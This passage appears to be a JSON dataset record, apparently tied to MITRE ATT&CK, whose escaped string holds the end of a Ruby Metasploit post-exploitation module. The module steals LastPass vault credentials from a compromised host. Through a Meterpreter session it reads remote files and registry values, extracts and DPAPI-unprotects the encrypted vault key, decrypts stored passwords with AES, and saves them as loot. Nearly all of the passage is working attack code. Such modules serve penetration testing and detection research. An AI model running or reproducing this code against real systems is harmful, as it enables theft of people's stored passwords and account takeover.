'username' || label == 'password')\n      pointer = pointer + 4 + length\n    end\n\n    return vault_data[0] == 'http://sn' ? nil : vault_data # TODO: Support secure notes\n  end\n\n  def decrypt_vault_password(key, encrypted_data)\n    return nil if key.blank? || encrypted_data.blank?\n\n    if encrypted_data[0] == '!' # Apply CBC\n      decipher = OpenSSL::Cipher.new('AES-256-CBC').decrypt\n      decipher.iv = encrypted_data[1, 16] # Discard !\n      encrypted_data = encrypted_data[17..]\n    else # Apply ECB\n      decipher = OpenSSL::Cipher.new('AES-256-ECB').decrypt\n    end\n    decipher.key = [key].pack 'H*'\n\n    begin\n      return decipher.update(encrypted_data) + decipher.final\n    rescue OpenSSL::Cipher::CipherError\n      vprint_error \"Vault password could not be decrypted with key #{key}\"\n      return nil\n    end\n  end\n\n  # Reads a remote file and loots it\n  def loot_file(path, data, title, type, description)\n    data = read_remote_file(path) if data.nil? # If no data is passed, read remote file\n    return nil if data.nil?\n\n    loot_path = store_loot(\n      title,\n      type,\n      session,\n      data,\n      nil,\n      description\n    )\n    loot_path\n  end\n\n  # Reads a remote file and returns the data\n  def read_remote_file(path)\n    data = nil\n\n    begin\n      data = read_file(path)\n    rescue EOFError\n      vprint_error \"Error reading file #{path} It could be empty\"\n    end\n    data\n  end\n\n  def read_registry_key_value(key, value)\n    begin\n      root_key, base_key = session.sys.registry.splitkey(key)\n      reg_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)\n      return nil unless reg_key\n\n      reg_value = reg_key.query_value(value)\n      return nil unless reg_value\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(\"#{e.message} (#{key}\\\\#{value})\")\n    end\n    reg_key.close if reg_key\n    return reg_value.blank? ? nil : reg_value.data\n  end\n\n  def extract_local_encrypted_vault_key(browser, username, lp_data)\n    if browser.match(/Firefox|IE/)\n      encrypted_key_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + '_lpall.slps'\n      encrypted_vault_key = read_remote_file(encrypted_key_path)\n      encrypted_vault_key = windows_unprotect(encrypted_vault_key) if !encrypted_vault_key.nil? && encrypted_vault_key.match(/^AQAAA.+/) # Verify Windows protection\n    else\n      db = SQLite3::Database.new(lp_data['lp_db_loot'])\n      result = db.execute(\n        'SELECT data FROM LastPassData ' \\\n        \"WHERE username_hash = ? AND type = 'key'\", OpenSSL::Digest::SHA256.hexdigest(username)\n      )\n      encrypted_vault_key = result[0][0]\n    end\n\n    return encrypted_vault_key.blank? ? nil : encrypted_vault_key.split(\"\\n\")[0] # Return only the key, not the \"lastpass rocks\" part\n  end\n\n  # Returns OS separator in a session type agnostic way\n  def system_separator\n    return session.platform == 'windows' ? '\\\\' : '/'\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux osx unix win]"
    ]
}